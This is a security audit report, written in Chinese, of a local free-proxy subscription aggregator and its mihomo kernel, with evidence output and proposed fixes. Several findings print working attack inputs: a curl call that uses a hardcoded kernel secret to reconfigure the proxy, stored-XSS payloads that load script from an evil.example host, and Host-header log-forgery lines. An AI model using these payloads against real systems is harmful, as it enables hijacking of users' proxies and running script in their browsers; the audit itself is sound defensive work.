# 安全审计 A · 网络服务与进程边界

**目标**：`E:\AI\freeVPN`（公开免费代理订阅聚合器 + 本地 HTTP 订阅服务 + mihomo 内核）
**范围**：`pool.py` 的 `PoolServer/serve/make_handler/Handler._route/_send/_deny/_log/_resolve_sub/render_page/PAGE`、`Kernel/_write_kernel_config/_kernel_check/_api/_delay`、`cmd_import/detect_clients/import_link/inject_verge/find_verge_dir`；`security.py` 的 `load_or_create_token/token_ok/host_ok/kernel_env/kernel_creationflags/kernel_preexec/harden_kernel_config`
**方式**：只读审计。所有结论都来自实际跑出来的脚本与输出，脚本在 `audit/` 下，输出原件在 `audit/_tmp/`。**未修改 `pool.py` / `security.py`**。
**审计机环境**：Windows，Python 3.13，`bin/mihomo.exe` 存在，生产实例 `python pool.py daemon` 正监听 `127.0.0.1:8787`（其 stderr 落在 `state/daemon.log`），Clash Verge 正在运行。
**HTTP 探测一律用 `curl.exe`**（PowerShell 的 `Invoke-WebRequest` 连接池默认只有 2，会给假超时）；curl 做不到的（多重 Host 头、慢连接、连上即断）用裸 socket。

---

## 结论摘要（按严重度）

| 编号 | 标题 | 严重度 |
|---|---|---|
| A-01 | 内核控制端口密钥硬编码 `"freevpn"` + mihomo API 开放 CORS，任意网页可改内核配置、把代理端口暴露到局域网 | **严重** |
| A-02 | 状态页存储型 XSS：订阅源节点名未转义直插 HTML | **高** |
| A-03 | 订阅令牌明文写进 `state/access.log`，且日志可被外部噪声触发整份删除 | **高** |
| A-04 | 非 ASCII 令牌触发未捕获 `TypeError`：客户端断连、每个请求 1.6 KB traceback 落盘、且该请求不写访问日志 | **中** |
| A-05 | `daemon --log` 的日志文件无上限无轮转，异常路径可写满磁盘 | **中** |
| A-06 | `kernel_env()` 是关键词黑名单而非白名单：`GITHUB_PAT`/`KUBECONFIG`/`VAULT_ADDR` 实测泄漏进内核进程 | **中** |
| A-07 | `harden_kernel_config` 只收口顶层，`proxies[]` 里的内核级字段原样下发并被内核接受 | **中** |
| A-08 | `inject_verge` 非原子写：`profiles.yaml` 先被截断为 0 再逐块写回 | **中** |
| A-09 | 服务无连接数上限、handler 无超时：半开连接长期占用线程 | **中** |
| A-10 | `state/token.txt`、`订阅地址.txt` 在 Windows 上 ACL 未收紧（`os.chmod(0o600)` 不生效） | 低 |
| A-11 | Host 头 obs-fold 换行注入访问日志（可伪造日志行） | 低 |
| A-12 | `inject_verge` 写入失败未捕获、备份不刷新、并发丢更新、用户注释被丢弃 | 低 |
| A-13 | `host_ok` 的 IPv4 分支不校验端口，与 IPv6 分支行为不一致 | 低 |
| A-14 | 响应头 `Server: freeVPN ` 暴露服务指纹 | 信息 |

**最需要先修的两条**：A-01（任意网页 → 用固定密钥改本机内核配置、把代理端口开到 0.0.0.0）与 A-02（订阅源 → 用户打开状态页即执行任意 JS）。这两条串起来就是完整的攻击链：A-02 拿到页面里的令牌与同源能力，A-01 拿到内核控制权。

---

## 详细发现

### A-01 · 内核控制端口密钥硬编码 + mihomo API 开放 CORS —— 任意网页可改内核配置、把代理端口暴露到局域网 · 严重

**位置**
- `pool.py:70` `SECRET = "freevpn"`（模块级常量，写死在源码里）
- `pool.py:1087` `"secret": SECRET` → `security.py:278` `cfg["secret"] = secret or secrets.token_urlsafe(18)`（**传入了 secret，所以永远不会走到随机分支**）
- `security.py:277` `cfg["external-controller"] = "127.0.0.1:19090"`

**证据 1：鉴权与 CORS**（`audit/A5_kernel.py`，真启动内核）

```
  内核监听: [('127.0.0.1', 17890), ('127.0.0.1', 19090)]
  --- 控制端口鉴权 ---
    pool.py 里写死的 SECRET = 'freevpn'
    用 SECRET 调 /proxies        -> 200
    用错误 secret 调 /proxies    -> 401
    用空 secret 调 /proxies      -> 401
  --- 控制端口的浏览器可达性 (CORS / preflight) ---
    带 Origin 的 GET  -> 200
      Access-Control-Allow-Origin: *
    preflight OPTIONS -> 200  ACAO=* ACAH=Authorization
```

复现命令（内核运行期间）：

```powershell
curl.exe -s -D - -o NUL -H "Origin: http://evil.com" -H "Authorization: Bearer freevpn" `
  http://127.0.0.1:19090/proxies
```

**证据 2：写操作真的生效**（`audit/A5b_api_surface.py`）

```
=== 写端点: PUT /configs 是否可改配置 ===
  PATCH /configs {'mode':'global'} -> HTTP 204
  改完之后 GET /configs mode = 'global'

=== 写端点: 能不能把代理端口暴露到局域网 ===
  改之前监听: ['127.0.0.1:17890', '127.0.0.1:19090']
  PATCH {'allow-lan': true, 'bind-address': '0.0.0.0'} -> HTTP 204
  改之后监听: ['0.0.0.0:17890', '127.0.0.1:19090', '[::]:17890']
  /configs 里 allow-lan=True  bind-address='0.0.0.0'
  >>> 代理端口已被暴露到所有接口 (0.0.0.0)
```

**证据 3：API 里到底有什么**（同一脚本；**节点凭据不在其中**）

```
  /configs 里 proxies 条数: 0
  /configs 里有没有 password 明文: False
  /configs 里有没有 uuid 明文: False
  /version -> OK   /configs -> OK   /proxies -> OK   /rules -> OK   /connections -> OK
```

**影响**
`external-controller` 的密钥是公开源码里的固定字符串，而 mihomo 的 REST API 回应 `Access-Control-Allow-Origin: *` 并且在 preflight 里显式放行 `Authorization` 头。这两点叠加的结果是：**用户浏览器里打开的任意网页**（不需要 DNS rebinding，直接 `fetch` 即可）在**内核存活窗口期内**可以：

- **改内核配置（实测生效）**：`PATCH /configs {"mode":"global"}` → `204`，内核被切成全局模式，用户全部流量进代理；
- **把代理端口暴露到局域网（实测生效）**：`PATCH /configs {"allow-lan":true,"bind-address":"0.0.0.0"}` → `204`，监听从 `127.0.0.1:17890` 变为 `0.0.0.0:17890` + `[::]:17890`。这一步**直接推翻了 `harden_kernel_config` 的 `allow-lan=false` 收口**——任意网页可以把用户的机器变成局域网开放代理；
- **读运行配置与规则**：`/configs`、`/rules`、`/proxies`（节点元数据：类型、id、alive、history；**不含** uuid/密码，实测确认）；
- **读连接状态**：`/connections`（返回 `connections/uploadTotal/downloadTotal`）。本次实测时无活动连接所以没取到条目，但该端点可读，其条目结构包含连接的目标信息——即"用户此刻在访问什么"的隐私面；
- **让内核替攻击者发请求**：`GET /proxies/{name}/delay?url=...`（A5 ③ 记录到内核真的发起了对本机 19090 的请求并返回 `504`），配合可读的 JSON 响应可做浏览器侧的内网探测。

内核只在 L2 测速期间存活（`Kernel.start/stop`），窗口是秒到分钟级；但网页可以 `setInterval` 轮询 19090，内核一起来就立刻下手。`pool.py` 自己给 8787 做了 Host 校验来挡 DNS rebinding（E-02），却把这个口子留在了 19090。

**修复建议**
1. 不要把 `pool.SECRET` 传进 `harden_kernel_config`：让 `security.py:278` 的随机分支生效（`secrets.token_urlsafe(18)`），并在 `_api()` 里用同一个随机值。密钥只在进程内存在，攻击者无法预知。**这是唯一可靠的代码层缓解**——CORS 是 mihomo 的行为，`pool.py` 关不掉它。
2. 更彻底：给 `external-controller` 绑定一个**每次运行随机的高位端口**（`127.0.0.1:0` 思路不可行，mihomo 需要固定端口；可在 19090 之外随机选 20000–60000）。
3. 收窄暴露窗口：内核只在 L2 测速期间存活（现在就是这样），把 `state/kernel` 的控制端口仅在需要时开、用完立刻 `stop()`。
4. 若必须固定端口，加一条本地防火墙规则只允许特定进程访问 19090（运维层缓解，代码层仍需 1）。

---

### A-02 · 状态页存储型 XSS：订阅源节点名未转义直插 HTML · 高

**位置**
- `pool.py:628-634` `clean_name()` —— 只剥控制字符、广告词、`[]【】()（）` 和旗帜，**不处理 `< > " ' & =`**
- `pool.py:1977-1980` `render_page()` 的 `fast_rows`：`f"<td>{f['name']}</td>"` 直接拼接
- `pool.py:2089` `security.py:audit_node()` 对节点名只做 `_LURE_RE` 广告词告警，不拦 HTML

**证据**（`audit/A6_xss.py`，走完整链路 `normalize → audit_pool → write_outputs → render_page → HTTP`）

```
  img/onerror(反引号)     入池名 -> '🌐 <img src=x onerror=alert`1`>'
  script 远程加载          入池名 -> '🌐 <script src=//evil.example/x.js>'
  svg onload           入池名 -> '🌐 <svg onload=alert`1`>'
  双引号闭合属性              入池名 -> '🌐 "><iframe src=//evil.example/y>'
  纯标签                  入池名 -> '🌐 <b>BOLD</b>'
  事件属性注入               入池名 -> '🌐 x" autofocus onfocus=alert`1`'
  安全审计: 扫描 6 拦截 0 告警 0
  >>> 未转义出现在 HTML 里的 payload: 6
  上下文: ...<tr><td>1</td><td>🌐 <img src=x onerror=alert`1`></td><td>XX</td>...

  GET /?token=<正确>  -> HTTP 200, 3824 字节
    Content-Type: text/html; charset=utf-8
    X-Content-Type-Options: nosniff
  >>> 响应体里出现未转义 payload 的条数: 6
```

复现（curl.exe，对任意实例）：

```powershell
curl.exe -s "http://127.0.0.1:8787/?token=<TOKEN>" | Select-String "onerror|<script"
```

**影响**
攻击者 = 公开免费订阅源的维护者（完全不可信，这正是项目自己在 `security.py` 开头声明的威胁模型）；受害者 = 用户本人。用户按 README 指引打开状态页（`http://127.0.0.1:8787/?token=…`）就会执行任意 JS。执行后可以：

- 读同源页面里的令牌、调 `127.0.0.1:8787` 的任意接口；
- 配合 A-01：直接 `fetch` 内核控制端口，把用户的内核配置改掉；
- 页面无 `Content-Security-Policy`（实测响应头只有 `nosniff` / `no-store` / `no-referrer`），没有任何兜底。

`clean_name` 的 38 字符截断不是防线：`<img src=x onerror=alert\`1\`>` 只有 30 字符。

**修复建议**
1. `render_page()` 里对所有来自产物的字符串做 `html.escape(x, quote=True)`（节点名、地区、协议名一律转义）。
2. 给状态页加 `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'`（页面只有内联样式，不需要脚本）。
3. 在 `clean_name()` 里剥掉 HTML 元字符（`< > " ' &`）作为第二道——但**不能替代转义**。

---

### A-03 · 订阅令牌明文写进访问日志，且日志可被外部噪声整份删除 · 高

**位置**
- `pool.py:2025-2027` `_log()` 写入 `{path}`，而 `path = self.path` 含完整查询串（`?token=…`）
- `pool.py:2022` `if ACCESS_LOG.exists() and ACCESS_LOG.stat().st_size > 1_000_000: ACCESS_LOG.unlink()`

**证据 1：明文落盘**（`audit/A3_token_log.py` ④，以及生产日志）

```
  生产 state/access.log: 共 170 行, 其中 146 行含完整令牌
    ...  GET  200  /sub/pool.yaml?token=ifBl9q…SVK5  host=127.0.0.1:8787  ua=curl/8.13.0  served pool.yaml
```

**证据 2：噪声撑大 + 触发清空**（`audit/A3b_logwipe.py`）

```
  单个请求写入日志 94 字节 -> 1 MB 阈值约需 10638 次请求
  实测发出 1500 次请求 (29s) -> 日志 140718 字节 (14.1% of 1MB)
  触发前 1212976 字节 / 12904 行
  触发后 94 字节 / 1 行
  >>> 日志被 unlink 后重建 —— 之前所有记录一次性消失
```

**影响**
1. **密钥落到第二个文件**：令牌本来只在 `state/token.txt`，现在 `state/access.log`（以及任何备份/同步工具看到的副本）也有明文。该文件的 ACL 继承自目录（`BUILTIN\Users:(RX)`，见 A-10）。
2. **痕迹擦除**：本机任意进程（或用户浏览器页面里的一段 JS，只要能连 8787）发约 1 万次无令牌请求就能把 `access.log` 整份删掉重建，之后无法回溯"谁在什么时候拉过订阅"。
3. 轮转策略本身也是反的：正常做法是**归档**旧日志，而不是 `unlink()`。

**修复建议**
1. `_log()` 里对 `path` 脱敏：`re.sub(r'(token|t)=[^&]*', r'\1=***', path)`。
2. 轮转改为重命名归档（`access.log.1`）并保留 N 份，而不是删除；或直接用 `logging.handlers.RotatingFileHandler`。
3. 令牌不再走查询串：项目已经支持 `Authorization: Bearer`，状态页里的输入框地址可以只保留 `?token=` 但至少让日志脱敏（1 是必须的）。

---

### A-04 · 非 ASCII 令牌触发未捕获 TypeError：断连 + traceback 落盘 + 不留访问日志 · 中

**位置**：`security.py:309-312` `secrets.compare_digest(provided, expected)` 对含非 ASCII 的 `str` 会抛 `TypeError`；`pool.py:2064` 调用处没有 try/except。

**证据 1：接口行为**（`audit/A1_gate.py`）

```
  [OK ] 非 ASCII token (?token=中文)                    -> 000(无响应/断连)
  [OK ] 非 ASCII Bearer 头                             -> 000(无响应/断连)
  [OK ] 非 ASCII token 走 /t/ 路径段                      -> 000(无响应/断连)
```

**证据 2：请求不落访问日志**（`audit/A3_token_log.py` ③）

```
  测试前日志行数: 3
  第 1..5 次 /?token=中文N  -> 000  body=0B
  测试后日志行数: 3   (增加 0 行)
  >>> 这 5 次请求没有留下任何日志
```

**证据 3：生产实例实测**（对正在跑的 8787 发一次请求）

```
daemon.log 之前: 5048 字节
非ASCII token 请求 -> HTTP 000
daemon.log 之后: 6645 字节  (增加 1597)

  File "E:\AI\freeVPN\pool.py", line 2064, in _route
    if not sec.token_ok(provided, token):
  File "E:\AI\freeVPN\security.py", line 312, in token_ok
    return secrets.compare_digest(provided, expected)
TypeError: comparing strings with non-ASCII characters is not supported
----------------------------------------
```

**影响**
- 客户端拿到的是连接断开而不是 `401`，客户端会把它报成"订阅不可用"，排障困难；
- 每次请求产生约 1.6 KB traceback（`socketserver.handle_error` 打完整栈），是 A-05 的直接弹药；
- **异常发生在 `_log()` 之前**，所以这类请求完全不进访问日志 —— 攻击者可以用它做不留痕的探测；
- 抛在请求线程里，不会拖垮服务（单次请求一个线程），所以是"中"而不是"高"。

**修复建议**：`token_ok` 里先做 ASCII 收敛，例如

```python
def token_ok(provided, expected):
    if not provided:
        return False
    try:
        return secrets.compare_digest(provided.encode("utf-8"), expected.encode("utf-8"))
    except (TypeError, UnicodeError):
        return False
```

（`compare_digest` 支持 bytes，且仍恒定时间。）

---

### A-05 · `daemon --log` 日志无上限无轮转，异常路径可写满磁盘 · 中

**位置**
- `pool.py:2339-2341` `sys.stdout = lf; sys.stderr = lf`（`open(args.log, "a")`，没有大小上限、没有轮转）
- `pool.py:1866` 自启生成的 VBS 固定带 `--log "state\daemon.log"`

**证据**
- `audit/A4_dos.py` ①（把 `sys.stderr` 接到文件，忠实模拟 daemon）：

```
  50 次「连上即断」:  stderr 增加 96450 字节 (~96 条 traceback)
  50 次「非 ASCII 令牌」: stderr 增加 79850 字节 (~80 条 traceback)
  单次请求平均写入 stderr: 1597 字节
  >>> 写满 1 GB 需要约 0.67 百万次请求
```

- 生产实测：`state/daemon.log` 因一次非 ASCII 请求从 5048 → 6645 字节（见 A-04 证据 3），说明**生产实例当前就在用 `--log`**。

**影响**
任何能连 `127.0.0.1:8787` 的本机进程（或浏览器页面）用"非 ASCII 令牌"或"连上即断"两类请求就能持续往 `state/daemon.log` 追加 traceback。约 67 万次请求写满 1 GB；写满磁盘会影响整个用户会话（不只是本项目）。自启路径（`pool.py autostart`）默认开启 `--log`，所以这是**默认配置下的风险**，不是边角情况。

**修复建议**
1. `cmd_daemon` 里换成按大小轮转的日志（`logging.handlers.RotatingFileHandler(maxBytes=8MB, backupCount=3)`），或至少给 `args.log` 加同样的 1 MB 上限 + 归档。
2. 给 `socketserver` 加 `handle_error` 覆盖：对 `ConnectionResetError` / `BrokenPipeError` 只记一行摘要（不打印完整 traceback），其他异常保留完整栈。这一条同时消掉 A-04 的日志放大效应。
3. 修掉 A-04 的 `TypeError`。

---

### A-06 · `kernel_env()` 是关键词黑名单而非白名单，凭据类变量会泄漏进内核 · 中

**位置**：`security.py:207-211` `_SENSITIVE_ENV_RE`、`security.py:216-227` `kernel_env()`

**证据**（`audit/A5_kernel.py` ①，向真实环境注入探针后调用 `sec.kernel_env()`）

```
  父进程变量 67 个, 传给内核 60 个, 剔除 7 个
  系统必需项检查: 缺失 无
  --- 黑名单缺口: 注入几个「不含关键词」的敏感变量名, 看是否被剔除 ---
    GITHUB_PAT               !! 泄漏进内核
    GITLAB_PAT               !! 泄漏进内核
    SSH_AUTH_SOCK            已剔除
    VAULT_ADDR               !! 泄漏进内核
    MY_API                   !! 泄漏进内核
    NPM_TOKEN                已剔除
    AWS_SECRET_ACCESS_KEY    已剔除
    KUBECONFIG               !! 泄漏进内核
```

**影响**
`_SENSITIVE_ENV_RE` 覆盖 `KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|AUTH|COOKIE|SESSION|PRIVATE|CERT|SIGNATURE|BEARER|DSH_|ANTHROPIC|OPENAI|AWS_|AZURE_|GCP_`。任何不含这些子串的凭据变量都会原样传给内核（以及内核拉起的任何子进程）。实测 `GITHUB_PAT`、`GITLAB_PAT`、`VAULT_ADDR`、`KUBECONFIG` 全部泄漏。内核加载的是**完全不可信的公开订阅配置**，把它能读到的环境面收窄是这类设计的本意——黑名单做不到这一点。另外 `SSH_AUTH_SOCK` 被剔除只是因为名字里碰巧含 `AUTH`（在黑名单里匹配 `AUTH`），这正说明该机制是巧合而非保证。

**修复建议**：改成白名单。只保留内核在 Windows 上确实需要的少数变量：

```python
_KEEP_ENV = ("SYSTEMROOT", "WINDIR", "PATH", "PATHEXT", "TEMP", "TMP",
             "COMSPEC", "NUMBER_OF_PROCESSORS", "PROCESSOR_ARCHITECTURE",
             "USERPROFILE", "APPDATA", "LOCALAPPDATA", "PROGRAMDATA", "HOMEDRIVE", "HOMEPATH")
def kernel_env():
    return {k: v for k, v in os.environ.items() if k.upper() in _KEEP_ENV}
```

（`security.py:204-206` 的注释担心白名单漏掉 `SYSTEMROOT` 会让内核静默不监听——那个失败模式可以用 `A5` 里的"内核启动后 netstat 校验控制端口"作为回归测试兜住。）

---

### A-07 · `harden_kernel_config` 只收口顶层，`proxies[]` 里的内核级字段被内核接受 · 中

**位置**：`security.py:261-283`（只处理顶层键）、`pool.py:1076-1099`（节点字段原样进 `proxies`）

**证据**（`audit/A5_kernel.py` ②，恶意节点字段全部来自"审计通过后仍会残留"的部分）

```
  顶层保留的键: ['allow-lan', 'external-controller', 'secret', 'ipv6', 'find-process-mode', 'log-level', 'geo-auto-update']
    allow-lan              = false
    external-controller    = "127.0.0.1:19090"
    secret                 = "freevpn"
    ipv6                   = false
    log-level              = "silent"
  解析后的顶层键: [...]  顶层 tun 存在: False   顶层 bind-address 存在: False
  恶意节点里这些字段是否原样进了 proxies:
    interface-name         保留
    dialer-proxy           保留
    routing-mark           保留
    bind-address           保留
    allow-lan              保留
    external-controller    保留
    tun                    保留
    skip-cert-verify       保留
  mihomo -t 校验: 通过
  --- 恶意节点字段是否被内核接受 ---
    n00000: type=Shadowsocks udp=True smux=True
    n00001: type=Shadowsocks udp=False smux=False
```

**影响**
顶层收口是有效的（`allow-lan=false`、`external-controller` 只绑回环、`tun`/`bind-address` 被删、`ipv6=false`、`log-level=silent`，见 E-10）。但 `_write_kernel_config` 把节点的**所有非 `_` 前缀字段**直接塞进 `proxies[]`，只改了 `name`。mihomo 对 proxy 条目里的内核级选项照单全收——实测 `udp`、`smux` 在 `/proxies` 里被内核确认为 `True`，而 `interface-name`（指定出站网卡）、`dialer-proxy`（改拨号链）、`routing-mark`、`skip-cert-verify` 全部原样保留并通过 `mihomo -t`。

订阅源因此可以：强制节点开 UDP（把 DNS/UDP 流量引到自己身上）、指定内核从哪块网卡出去、把该节点接到另一条拨号链上、关掉证书校验（`security.py:152-154` 只 warn 不 block）。这些都**不突破**"只绑回环 / 禁 tun"这两条核心边界，但属于 harden 的盲区：它管住了进程级配置，没管住每个节点的出站行为。

**修复建议**：对每个 proxy 做字段白名单（按 `type` 分别列出允许的键），例如

```python
_ALLOWED_PROXY_KEYS = {
    "vmess": {"name","type","server","port","uuid","alterId","cipher","tls","servername",
              "network","ws-opts","grpc-opts","reality-opts","skip-cert-verify"},
    "ss":    {"name","type","server","port","cipher","password","udp"},
    ...
}
```

其余键直接丢弃（或降级成"仅在白名单内才保留"）。

---

### A-08 · `inject_verge` 非原子写：`profiles.yaml` 先被截断为 0 再逐块写回 · 中

**位置**：`pool.py:1687-1689` `idx.write_text("# Profiles Config…" + _y.safe_dump(data), encoding="utf-8")`

**证据**（`audit/A7_verge.py` ②，6 MB 配置 + 200 µs 采样线程）

```
  写入前 profiles.yaml = 6291749 字节
  inject_verge -> True, 耗时 4249 ms
  采样 154 次, 观测到的最小大小 = 0 字节
  观测到 0 字节(被截断)的次数: 1
  观测到的中间态(<最终大小)次数: 152
  写入后大小 = 6292001 字节
  >>> 非原子写成立: 文件先被清空再逐块写回, 中途崩溃/断电会留下半截配置
```

**影响**
`Path.write_text` 是 `open("w")` + `write`，会先把文件截断为 0。写入过程中进程被杀 / 断电 / 磁盘写满，用户拿到的就是半个 YAML，Clash Verge 会拒绝加载或丢掉订阅列表。备份机制（`profiles.yaml.freevpn.bak`）能救，但前提是用户知道去看它——而 `inject_verge` 的提示只在一开始打印一次。

**修复建议**：写临时文件再原子替换：

```python
tmp = idx.with_suffix(".yaml.tmp")
tmp.write_text(payload, encoding="utf-8")
os.replace(tmp, idx)     # 同卷内原子
```

Windows 上 `os.replace` 是原子的（`MoveFileEx` + `REPLACE_EXISTING`）。

---

### A-09 · 服务无连接数上限、handler 无超时，半开连接长期占用线程 · 中

**位置**：`pool.py:2129-2138` `class PoolServer(ThreadingHTTPServer)` —— 只有 `allow_reuse_address = False` 与 `daemon_threads = True`，没有 `request_queue_size` 调整、没有连接数上限、没有 `timeout`。

**证据**（`audit/A4_dos.py` ②）

```
  基线线程数 2, 基线延迟 ['2', '16', '1'] ms
  建立 300 条半开连接后: 线程数 302, 工作集 42.3 MB
  此时正常请求延迟: ['1', '1', '1'] ms
  关闭后线程数回落: 2
```

**影响**
`ThreadingHTTPServer` 每个连接一个线程，`BaseHTTPRequestHandler` 没有设置 `timeout`，所以一条"只发半行请求、永不发完"的连接会**无限期**占住一个线程。实测 300 条半开连接 → 302 个线程、工作集 +6 MB。**在 300 条这个规模下服务没有变慢**（延迟仍是 1 ms，因为线程都阻塞在 I/O 上、不抢 GIL），所以这不是"一个请求就能打死服务"，而是"资源随连接数线性增长、没有天花板"：规模上去会耗尽线程栈内存、句柄与调度预算。触发者可以是本机任意进程，也可以是浏览器页面（同源策略不阻止 `fetch` 发出请求，只阻止读响应）。

**修复建议**
1. 给 handler 设 `timeout`（例如 10 秒），并覆盖 `handle_timeout()` 关闭连接：`class H(BaseHTTPRequestHandler): timeout = 10`。
2. 限制并发连接数（`socketserver` 没有内建支持，可在 `PoolServer.process_request` 里用一个 `Semaphore` 计数，超过阈值直接拒绝或排队）。
3. 调小 `request_queue_size` 并观察 backlog 溢出（当前是 `socketserver` 默认 5，实际上 `listen()` 的参数由 `request_queue_size` 决定）。

---

### A-10 · `token.txt` / `订阅地址.txt` 的 ACL 在 Windows 上未收紧 · 低

**位置**：`security.py:302-305` `os.chmod(_TOKEN_FILE, 0o600)`（Windows 上只映射到只读位，不改 ACL）；`pool.py:63` `ADDR_FILE = ROOT / "订阅地址.txt"`、`pool.py:2175` 写入含令牌的订阅地址。

**证据**

```
=== icacls state\token.txt ===
state\token.txt DESKTOP-CJ40M9U\xyw:(I)(F)
                BUILTIN\Administrators:(I)(F)
                NT AUTHORITY\SYSTEM:(I)(F)
                NT AUTHORITY\Authenticated Users:(I)(M)
                BUILTIN\Users:(I)(RX)
=== 属性 ===
Attributes : Archive          (不是 ReadOnly —— chmod 连只读位都没落上)

=== 订阅地址.txt 内容 ===
http://127.0.0.1:8787/sub/pool.yaml?token=ifBl9q…SVK5
```

**影响**
设计意图（`0o600`）在 Windows 上不生效：`Authenticated Users` 有修改权限、`Users` 有读取权限。任何本机用户/进程都能读走令牌，进而读订阅（并配合 A-03 从日志里也能拿到）。同理 `订阅地址.txt` 直接明文存放令牌。

**修复建议**
1. 用 `icacls` 或 `win32security` 把 ACL 收紧到"仅当前用户 + SYSTEM"：
   `icacls state\token.txt /inheritance:r /grant:r "%USERNAME%:F" /grant:r "SYSTEM:F"`
2. `订阅地址.txt` 同样处理，或干脆不写文件（控制台已经打印了地址）。
3. 文档里明确"令牌等于订阅访问权"，别把它当成非敏感数据。

---

### A-11 · Host 头 obs-fold 换行注入访问日志 · 低

**位置**：`pool.py:2026` `f"host={self.headers.get('Host')}\t"` —— `email.message.Message` 会把 obs-fold 续行合并成含 `\n` 的值，日志直接写入。

**证据**（`audit/A3_token_log.py` ⑥，裸 socket 发送 `Host: 127.0.0.1:PORT\r\n\tFORGED…`）

```
  响应: HTTP/1.0 403 Forbidden
  日志文件实际内容:
    |2026-09-30 18:45:45	GET	403	/sub/pool.yaml?token=…	host=127.0.0.1:8791
    |
    |	FORGED-BY-ATTACKER 2026-09-30 00:00:00	GET	200	/	attack	ua=	forbidden host
  >>> 日志里出现了伪造的独立行
```

**影响**
能发原始报文的进程可以往 `access.log` 里插入任意"看起来正常"的日志行（例如伪造一条 `200 /sub/pool.yaml` 的记录），污染事后取证。不能读文件、不能执行代码。

**修复建议**：日志字段统一转义（把 `\r\n\t` 换成 `\xNN` 或空格），Host 头单独做一次 `re.sub(r"[\x00-\x1f\x7f]", "?", host)`。

---

### A-12 · `inject_verge` 的失败路径与并发问题 · 低

**位置**：`pool.py:1657-1689`

**证据**（`audit/A7_verge.py` ①③④）

```
① 备份是否被更新: False  (False = 第二次没有刷新备份)
   用户手改的那行是否还在: False      ← 用户注释被丢弃
③ inject_verge 抛出 PermissionError: [Errno 13] Permission denied: '…\profiles.yaml'
   >>> 写入失败没有被捕获, 异常直接冒到调用方
   原文件是否被破坏: True             ← 只读时原文件安全
④ items 总数 3, 其中 freeVPN条目 1 条 (两个线程各插一条, 期望 2)
   >>> 丢失更新: 后写的一方覆盖了前一方
⓪ 真实环境里 Clash Verge 正在运行时的行为
   verge_running() 实测 -> True      ← 这条防护是有效的(见 E-14)
```

**影响**
- 写入失败（只读、磁盘满、权限）时 `PermissionError` 直接冒到调用方；在 `daemon` 模式下会变成一条 traceback 写进日志（叠加 A-05）。原文件不会被破坏。
- `shutil.copy2` 只在备份不存在时执行（`pool.py:1659`），所以第二次运行时备份仍是**第一次**的原始配置。若用户在两次运行之间手改过配置，备份与他以为的"原始"不一致。
- 用 `safe_load` + `safe_dump` 整份重写会丢掉用户配置里的注释与格式（实测"用户手改"那行消失）。
- 两个线程/进程并发写会互相覆盖（丢失更新）。本次实测没出现文件交错损坏，但 `open("w")` + 多次 `write` 在内容较大时存在交错可能。

**修复建议**
1. 写入包 try/except，失败时明确报错并给出恢复指引（备份路径）。
2. 备份改成带时间戳的轮转（`profiles.yaml.freevpn.20260930-184500.bak`），并保留最近 N 份。
3. 加一个简单的文件锁（`msvcrt.locking` 或旁路 `*.lock`）避免并发写。
4. 若在意注释丢失，改用行级插入而不是整份 `safe_dump`。

---

### A-13 · `host_ok` 的 IPv4 分支不校验端口 · 低

**位置**：`security.py:315-327` —— IPv6 分支 `h in (f"[::1]:{port}", "[::1]")` 严格校验端口；IPv4 分支 `host = h.rsplit(":", 1)[0]` 把端口整段丢掉，只比对主机名。

**证据**（`audit/A1_gate.py` + `audit/A2_traversal.py`）

```
  [OK ] Host: 127.0.0.1:8789                         -> 200
  [OK ] Host: 127.0.0.1:9999 (错端口)                  -> 200     ← 端口不校验 (A1)
  [OK ] Host: [::1]:9999 (错端口)                      -> 403     ← 行为不一致 (A1)
  Host 尾随逗号 + 合法值                                  -> HTTP/1.0 200 OK  (A2, 裸 socket)
```

**影响**：不构成 DNS rebinding 绕过（浏览器不会发这种 Host），只是两个分支语义不一致、且逗号后的内容被静默忽略。若将来前面挂反向代理，错误的端口校验可能掩盖配置错误。

**修复建议**：统一按 `host, port` 解析（处理 `[::1]:port` 形式），端口不匹配即 403；并对 `,` 分隔的多值 Host 直接拒绝。

---

### A-14 · `Server: freeVPN ` 指纹 · 信息

`make_handler` 里 `server_version = "freeVPN"`、`sys_version = ""`，响应头是 `Server: freeVPN `（带尾随空格）。无害，但让本机扫描器一眼识别出服务身份。建议设为空字符串。

---

## 已排除（都跑了验证，不是"读代码觉得没问题"）

| 编号 | 结论 | 验证 |
|---|---|---|
| E-01 | **不知道令牌读不到任何东西**：订阅、状态页、`report.json` 全部 401 | A1：无 token / 错 token / 空 token / 大小写翻转 / 截断 / 前后空格 全部 401；`?t=`、`Bearer`、`/t/<token>/` 三种合法形式 200 |
| E-02 | **Host 校验能挡 DNS rebinding**：`evil.com`、`127.0.0.1.evil.com`、`evil.com@127.0.0.1`、`127.0.0.1:8789:evil.com`、`[::ffff:127.0.0.1]:8789`、空 Host 全部 403；`X-Forwarded-Host` / `X-Real-Host` 不被采信（`Host: evil.com` + `X-Forwarded-Host: 127.0.0.1` → 403） | A1 |
| E-03 | **路径穿越被挡住**：52 个 payload 全部 404，**0 条越界**。含 `../`、`..%2f`、`..%5c`、`%2e%2e%2f`、`%252e%252e%252f`（双重编码）、`....//`、`..;/`、`..%00/`、`/sub/../state/token.txt`、`/sub/../pool.py`、`C:%5cWindows`、`%5c%5c127.0.0.1%5cc$`、`\\\\127.0.0.1\\c$`、短名 `POOL~1.YAM`、保留名 `CON/NUL/PRN/AUX/COM1/LPT1`、`NUL.yaml`、`.hidden`、`..%09/` | A2 ① |
| E-04 | **多重 Host 头不构成绕过**：`email.message` 取第一个 Host 值，攻击者无法让"第一个是 evil.com 但被当成 127.0.0.1" | A2 ②（裸 socket 双向都测了） |
| E-05 | **`token_ok` 是恒定时间比较**：20000 次基准，完全错误 0.076 µs / 前缀正确 31 字节 0.075 µs / 完全正确 0.075 µs，无线性增长 | A3 ② |
| E-06 | **令牌熵足够**：`secrets.token_urlsafe(24)` = 24 字节 = 192 bit，实测 32 字符 | A3 ① |
| E-07 | **订阅服务不下发 CORS 头**，且有 `X-Content-Type-Options: nosniff`、`Cache-Control: no-store`、`Referrer-Policy: no-referrer` | 生产 8787 响应头实测（`Access-Control-Allow-Origin` 不存在） |
| E-08 | **订阅服务只绑回环**：`Get-NetTCPConnection` 显示 `127.0.0.1:8787` | 生产实例实测 |
| E-09 | **内核的 mixed-port 与 external-controller 只绑回环**：`127.0.0.1:17890`、`127.0.0.1:19090`，无 `0.0.0.0` | A5 ③（真启动内核 + netstat 按 pid 过滤） |
